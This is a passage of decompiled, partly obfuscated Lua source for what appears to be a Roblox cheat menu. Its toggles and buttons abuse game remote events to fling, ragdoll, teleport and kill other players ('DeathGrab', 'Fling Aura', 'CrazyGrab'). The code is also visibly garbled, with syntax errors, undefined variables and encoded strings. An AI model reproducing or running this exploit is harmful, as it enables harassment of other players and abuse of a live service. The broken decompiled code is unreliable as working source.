                    FoodHamburger = r67("FoodHamburger");
                    tonumber = FoodHamburger;
                    tonumber:FindFirstChild("HoldPart");
                    task.wait(.007);
                    tonumber = FoodHamburger;
                    if tonumber:FindFirstChild("HoldPart") then
                        tonumber = FoodHamburger.HoldPart;
                        tonumber:FindFirstChild("HoldItemRemoteFunction");
                        task.wait(.007);
                        tonumber = FoodHamburger.HoldPart;
                        if tonumber:FindFirstChild("HoldItemRemoteFunction") then
                            task.spawn(function(...)
                                tonumber = FoodHamburger.HoldPart.HoldItemRemoteFunction;
                                tonumber:InvokeServer(FoodHamburger, v21);
                                return; 
                            end);
                            task.wait(.05);
                            task.spawn(function(...)
                                tonumber = FoodHamburger.HoldPart.DropItemRemoteFunction;
                                tonumber:InvokeServer(FoodHamburger, r29.CFrame * CFrame.new(0, 10, 0), Vector3.zero);
                                return; 
                            end);
                            task.wait(.035);
                        end;
                    end;
                end; 
            end;
            return; 
        end
    });
    v79:AddButton({
        ["Name"] = "Bread ANTIKICK",
        ["Callback"] = function(...)
            bread = r67("FoodBread");
            instance = not bread or not bread:FindFirstChild("SoundPart");
            tonumber = "bread";
            if instance then
                tonumber = game.ReplicatedStorage.GrabEvents.SetNetworkOwner;
                tonumber:FireServer(bread.SoundPart, bread.SoundPart.CFrame);
                tonumber = task.wait;
                tonumber();
                bread = bread;
                instance = not bread or not bread:FindFirstChild("SoundPart");
                tonumber = tonumber;
                if instance then
                    if instance then
                        r74(bread, false);
                        task.spawn(function(...)
                            while bread.Parent ~= nil do
                                task.wait();
                                bread.SoundPart.CFrame = r93.CFrame * CFrame.Angles(math.rad(90), 0, 0);
                                bread.SoundPart.AssemblyAngularVelocity = Vector3.zero;
                                bread.SoundPart.AssemblyLinearVelocity = Vector3.zero; 
                            end;
                            return; 
                        end);
                        return;
                    end;
                else
                    
                end;
            else
                
            end; 
        end
    });
    v79:AddButton({
        ["Name"] = "Counter everything...Teleport to -ASTRAL",
        ["Callback"] = function(...)
            workspace.FallenPartsDestroyHeight = 0 / 0;
            r29.CFrame = CFrame.new(-50000000, -50000000, 0);
            return; 
        end
    });
    v79:AddButton({
        ["Name"] = "DestroyGucci",
        ["Callback"] = function(...)
            LocalPlayer.IsHeld.Value = false;
            for T = 1, 100 do
                r28.Sit = true; 
            end;
            task.wait(.1);
            r28.Sit = false;
            return; 
        end
    });
    r47.Strength = 300;
    v80:AddSlider({
        ["Name"] = "Slider",
        ["Min"] = 600,
        ["Max"] = 10000,
        ["Default"] = 600,
        ["Color"] = Color3.fromRGB(255, 80, 80),
        ["Increment"] = 100,
        ["ValueName"] = "S",
        ["Save"] = true,
        ["Flag"] = "Strength",
        ["Callback"] = function(arg1_36, ...)
            r47.Strength = arg1_36;
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "Super Strength",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "SuperStrengthToggle",
        ["Callback"] = function(arg1_37, ...)
            if arg1_37 then
                instance = workspace.ChildAdded;
                r45.SuperGrab = instance:Connect(function(arg1_38, ...)
                    if T.Name == "GrabParts" then
                        arg1_38:WaitForChild("GrabPart", 1);
                        i = arg1_38:FindFirstChild("GrabPart") or ;
                        if i then
                            i:WaitForChild("WeldConstraint", 1);
                            instance = i:FindFirstChild("WeldConstraint") or ;
                        end;
                    end;
                    return; 
                end);
                instance = game:GetService("UserInputService").InputBegan;
                r45.WaitUIS = instance:Connect(function(arg1_39, ...)
                    if arg1_39.UserInputType == Enum.UserInputType.MouseButton2 then
                        if r94 then
                            i = Instance.new("BodyVelocity", r94);
                            i.MaxForce = Vector3.new(math.huge, math.huge, math.huge);
                            i.Velocity = workspace.CurrentCamera.CFrame.LookVector * r47.Strength;
                            tonumber = Debris;
                            tonumber:AddItem(i, 4);
                        end;
                    end;
                    return; 
                end);
                r45.DeleteObj = workspace.ChildRemoved:Connect(function(arg1_40, ...)
                    if arg1_40.Name == "GrabParts" then
                        task.delay(1, function(...)
                            D[2] = nil;
                            return; 
                        end);
                    end;
                    return; 
                end);
            else
                r57("SuperGrab");
                r57("WaitUIS");
                r57("DeleteObj");
            end;
            return; 
        end
    });
    v80:AddSection({
        ["Name"] = "Grabs"
    });
    v80:AddToggle({
        ["Name"] = "MassLessGrab",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "MassLessGrab",
        ["Callback"] = function(arg1_41, ...)
            if arg1_41 then
                i = game.Workspace.ChildAdded;
                r45.MassLess = i:Connect(function(arg1_42, ...)
                    tonumber = T.Name == "GrabParts";
                    if tonumber then
                        tonumber = game.Workspace;
                        while tonumber:FindFirstChild("GrabParts") do
                            task.wait(0);
                            T.DragPart.AlignPosition.Responsiveness = r47.Sense;
                            T.DragPart.AlignOrientation.Responsiveness = r47.Sense;
                            T.DragPart.AlignPosition.MaxForce = math.huge;
                            T.DragPart.AlignPosition.MaxVelocity = math.huge;
                            T.DragPart.AlignOrientation.MaxTorque = math.huge; 
                        end;
                    end;
                    return; 
                end);
            else
                r57("MassLess");
            end;
            return; 
        end
    });
    v80:AddSlider({
        ["Name"] = "Slider",
        ["Min"] = 1,
        ["Max"] = 200,
        ["Default"] = 30,
        ["Color"] = Color3.fromRGB(255, 0, 255),
        ["Increment"] = 1,
        ["ValueName"] = "Sense",
        ["Callback"] = function(arg1_43, ...)
            r47.Sense = arg1_43;
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "SpinGrab",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "SpinGrab",
        ["Callback"] = function(arg1_44, ...)
            if arg1_44 then
                r45.SpinGrab = workspace.ChildAdded:Connect(function(arg1_45, ...)
                    if T.Name == "GrabParts" then
                        instance = Instance.new("BodyAngularVelocity", T.GrabPart.WeldConstraint.Part1);
                        instance.AngularVelocity = Vector3.new(0, 10, 0);
                        instance.MaxTorque = Vector3.new(0, math.huge, 0);
                    end;
                    return; 
                end);
            else
                r57("SpinGrab");
            end;
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "Ragdoll Grab",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "RagdollGrab",
        ["Callback"] = function(arg1_46, ...)
            if arg1_46 then
                tonumber = r30;
                instance = "PalletLightBrown";
                if tonumber:FindFirstChild(instance) then
                    tonumber = r30;
                    PalletLightBrown = tonumber:FindFirstChild("PalletLightBrown");
                    instance = PalletLightBrown.SoundPart;
                    tonumber = not instance:FindFirstChild("PartOwner");
                    if tonumber then
                        instance = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = PalletLightBrown.SoundPart.CFrame;
                        tonumber = PalletLightBrown.SoundPart;
                        tonumber:FindFirstChild("PartOwner");
                        game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = PalletLightBrown.SoundPart.CFrame;
                        tonumber = game.ReplicatedStorage.GrabEvents.SetNetworkOwner;
                        tonumber:FireServer(PalletLightBrown.SoundPart, nil);
                        task.wait(.05);
                        tonumber = PalletLightBrown.SoundPart;
                        RbxAnalyticsService = "PartOwner";
                        if tonumber:FindFirstChild(RbxAnalyticsService) then
                            game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame;
                            r74(PalletLightBrown, false);
                            task.wait(.1);
                            instance = Instance.new("BodyPosition", PalletLightBrown.SoundPart);
                            instance.Position = Vector3.new(0, 2000, 0);
                            instance.MaxForce = Vector3.new(1000000000, 1000000000, 1000000000);
                            r45.Ragdoll = workspace.ChildAdded:Connect(function(arg1_47, ...)
                                i = T.Name == "GrabParts";
                                if i and (T.GrabPart and (T.GrabPart.WeldConstraint and T.GrabPart.WeldConstraint.Part1)) then
                                    i = T.GrabPart.WeldConstraint.Part1.Parent;
                                    if i:FindFirstChild("HumanoidRootPart") then
                                        if PalletLightBrown and "\x89\xb0Y\xf1\xc2\xdc\x15\xce,\x0b\xaa\xca\xbdJv\xf3" then
                                            instance = instance:FindFirstChild("PalletLightBrown").SoundPart.CFrame;
                                            task.wait(.4);
                                            i:FindFirstChild("HumanoidRootPart").Anchored = true;
                                            r30:FindFirstChild("PalletLightBrown").SoundPart.AssemblyAngularVelocity = Vector3.new(1000, 1000, 1000);
                                            r30:FindFirstChild("PalletLightBrown").SoundPart.AssemblyLinearVelocity = Vector3.new(1000, 1000, 1000);
                                            tonumber = task.wait;
                                            tonumber();
                                            Humanoid = i:FindFirstChild("Humanoid");
                                            A = not Humanoid;
                                            if A then
                                                r30:FindFirstChild("PalletLightBrown").SoundPart.CFrame = i:FindFirstChild("HumanoidRootPart").CFrame * CFrame.Angles(math.rad(90), 0, 0);
                                                r30:FindFirstChild("PalletLightBrown").SoundPart.AssemblyAngularVelocity = Vector3.new(1000, 1000, 1000);
                                                r30:FindFirstChild("PalletLightBrown").SoundPart.AssemblyLinearVelocity = Vector3.new(1000, 1000, 1000);
                                                tonumber = task.wait;
                                                tonumber();
                                                Humanoid = i:FindFirstChild("Humanoid");
                                                tonumber = tonumber;
                                                if not Humanoid or (not arg1_47 or (not T.GrabPart or i.Humanoid.Ragdolled.Value)) then
                                                    i:FindFirstChild("HumanoidRootPart").Anchored = false;
                                                    r30 = instance:FindFirstChild("PalletLightBrown").SoundPart.CFrame;
                                                    r30:FindFirstChild("PalletLightBrown").SoundPart.CFrame = r30;
                                                    r30:FindFirstChild("PalletLightBrown").SoundPart.AssemblyAngularVelocity = Vector3.zero;
                                                    return;
                                                end;
                                            else
                                                tonumber = not arg1_47;
                                                if tonumber then
                                                    tonumber = tonumber;
                                                else
                                                    tonumber = tonumber;
                                                end;
                                            end;
                                        end;
                                    end;
                                end; 
                            end);
                            return;
                        end;
                    end;
                else
                    r95 = r67("PalletLightBrown");
                    tonumber = r95;
                    tonumber:FindFirstChild("SoundPart");
                    task.wait(.05);
                    tonumber = r95;
                    if tonumber:FindFirstChild("SoundPart") then
                        tonumber = r95.SoundPart;
                        tonumber:FindFirstChild("PartOwner");
                        tonumber = game.ReplicatedStorage.GrabEvents.SetNetworkOwner;
                        tonumber:FireServer(r95.SoundPart, nil);
                        task.wait(.05);
                        tonumber = r95.SoundPart;
                        if tonumber:FindFirstChild("PartOwner") then
                            task.wait(.1);
                            A = Instance.new("BodyPosition", r95.SoundPart);
                            A.Position = Vector3.new(0, 2000, 0);
                            A.MaxForce = Vector3.new(1000000000, 1000000000, 1000000000);
                            r74(r95, false);
                        end;
                    end;
                end;
            else
                r57("Ragdoll");
            end; 
        end
    });
    v80:AddToggle({
        ["Name"] = "DeathGrab",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "DeathGrab",
        ["Callback"] = function(arg1_48, ...)
            if arg1_48 then
                i = workspace.ChildAdded;
                r45.DeathGrab = i:Connect(function(arg1_49, ...)
                    if T.Name == r15[D[i](" \xe5!\x8b*6$[W", 11681734989119)] then
                        instance = T.GrabPart.WeldConstraint.Part1.Parent;
                        if instance:FindFirstChild("Humanoid") and (r15 and instance.Head.PartOwner) then
                            instance:FindFirstChild("Humanoid").Health = 0;
                            instance:FindFirstChild("Humanoid").Health = 1;
                            instance:FindFirstChild("Humanoid").Health = 0;
                        end;
                    end;
                    return; 
                end);
            else
                r57("DeathGrab");
            end;
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "CrazyGrab",
        ["Default"] = false,
        ["Save"] = true,
        ["Flag"] = "CrazyGrab",
        ["Callback"] = function(arg1_50, ...)
            if arg1_50 then
                i = workspace.ChildAdded;
                r45.CrazyGrab = i:Connect(function(arg1_51, ...)
                    tonumber = T.Name == "GrabParts";
                    if tonumber then
                        i = T.GrabPart.WeldConstraint.Part1.Parent;
                        HumanoidRootPart = i:FindFirstChild("HumanoidRootPart");
                        if not HumanoidRootPart then
                            return;
                        end;
                        tonumber = workspace;
                        while tonumber:FindFirstChild("GrabParts") do
                            HumanoidRootPart.CFrame = CFrame.new(0, -20, 0);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(1000000000, -20, 0);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(-1000000000, -20, 0);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(1000000000, -20, 1000000000);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(1000000000, -20, -1000000000);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(0, -20, 1000000000);
                            task.wait(.05);
                            HumanoidRootPart.CFrame = CFrame.new(1000000000, 1000000000, 1000000000);
                            task.wait(.05); 
                        end;
                    end;
                    return; 
                end);
            else
                r57("CrazyGrab");
            end;
            return; 
        end
    });
    v80:AddSection({
        ["Name"] = "Advanced Line Mods"
    });
    v80:AddToggle({
        ["Name"] = "RGB line[FE]",
        ["Default"] = false,
        ["Callback"] = function(arg1_52, ...)
            r46.RGBLine = arg1_52;
            while r46.RGBLine do
                tonumber = r43;
                tonumber:FireServer(unpack({
                    [1] = ColorSequence.new({
                        ColorSequenceKeypoint.new(0, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                        ColorSequenceKeypoint.new(0.5, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255))),
                        ColorSequenceKeypoint.new(1, Color3.fromRGB(math.random(0, 255), math.random(0, 255), math.random(0, 255)))
                    })
                }));
                task.wait(.1); 
            end;
            return; 
        end
    });
    v80:AddButton({
        ["Name"] = "Return base color",
        ["Callback"] = function(...)
            tonumber = r43;
            tonumber:FireServer(unpack({
                [1] = ColorSequence.new({
                    ColorSequenceKeypoint.new(0, Color3.fromRGB(230, 255, 240)),
                    ColorSequenceKeypoint.new(.09, Color3.fromRGB(180, 255, 200)),
                    ColorSequenceKeypoint.new(.18, Color3.fromRGB(130, 255, 160)),
                    ColorSequenceKeypoint.new(.27, Color3.fromRGB(100, 240, 180)),
                    ColorSequenceKeypoint.new(.36, Color3.fromRGB(90, 200, 255)),
                    ColorSequenceKeypoint.new(.45, Color3.fromRGB(80, 150, 255)),
                    ColorSequenceKeypoint.new(.54, Color3.fromRGB(110, 110, 255)),
                    ColorSequenceKeypoint.new(.63, Color3.fromRGB(160, 80, 255)),
                    ColorSequenceKeypoint.new(.72, Color3.fromRGB(200, 60, 255)),
                    ColorSequenceKeypoint.new(.81, Color3.fromRGB(255, 40, 200)),
                    ColorSequenceKeypoint.new(.9, Color3.fromRGB(255, 30, 80)),
                    ColorSequenceKeypoint.new(1, Color3.fromRGB(0, 0, 0))
                })
            }));
            task.wait();
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "Crazy Line(Players)",
        ["Default"] = false,
        ["Callback"] = function(arg1_53, ...)
            r46.CrazyLinePlr = arg1_53;
            while r46.CrazyLinePlr do
                arg1_53 = game.Players[2];
                A = A[1];
                for instance, v10 in ipairs(A:GetPlayers()) do
                    Character = v10.Character;
                    if Character then
                        Head = Character:FindFirstChild("Head");
                        if Head then
                            tonumber = r41;
                            tonumber:FireServer(Head, Head.CFrame);
                            task.wait();
                        end;
                    end; 
                end; 
            end;
            return; 
        end
    });
    v80:AddSection({
        ["Name"] = "Auras"
    });
    v80:AddSlider({
        ["Name"] = "Fling Aura Power",
        ["Min"] = 600,
        ["Max"] = 10000,
        ["Default"] = 600,
        ["Color"] = Color3.fromRGB(255, 80, 80),
        ["Increment"] = 100,
        ["ValueName"] = "S",
        ["Save"] = true,
        ["Flag"] = "FlingAuraStrength",
        ["Callback"] = function(arg1_55, ...)
            r47.flingPwr = arg1_55;
            return; 
        end
    });
    v80:AddToggle({
        ["Name"] = "Fling Aura",
        ["Default"] = false,
        ["Callback"] = function(arg1_56, ...)
            r46.FlingAura = arg1_56;
            if r46.FlingAura then
                while r46.FlingAura do
                    task.wait();
                    for instance, v10 in pairs(("pairs"):GetPlayers()) do
                        task.wait();
                        if v10 ~= LocalPlayer and (not r96(v10) and (r46.FlingAura and LocalPlayer.Character)) then
                            HumanoidRootPart = v10.Character:FindFirstChild("HumanoidRootPart");
                            if HumanoidRootPart then
                                r69(HumanoidRootPart);
                                task.wait();
                                table = r15;
                                if not HumanoidRootPart:FindFirstChild("BodyVelocity") then
                                    instance5 = Instance.new("BodyVelocity");
                                    instance5.MaxForce = Vector3.new(1000000000, 1000000000, 1000000000);
                                    instance5.Velocity = r29.CFrame.LookVector * r47.flingPwr;
                                    table = "Parent";
                                    instance5.Parent = table;
                                end;
                            end;
                        end; 
                    end; 
                end;
            end;
            return; 
        end
    });
    v80:AddSection({
        ["Name"] = "c00lLine"
    });
    v80:AddSlider({
        ["Name"] = "Colors Count",
        ["Min"] = 1,
        ["Max"] = 20,
        ["Default"] = 5,
        ["Color"] = Color3.fromRGB(255, 255, 255),
        ["Increment"] = 1,
        ["ValueName"] = "colors",
        ["Save"] = true,
        ["Flag"] = "ColorPicker123322231",
        ["Callback"] = function(arg1_57, ...)
            r47.sliderValue = arg1_57;
            return; 
        end
    });
else
    
end;
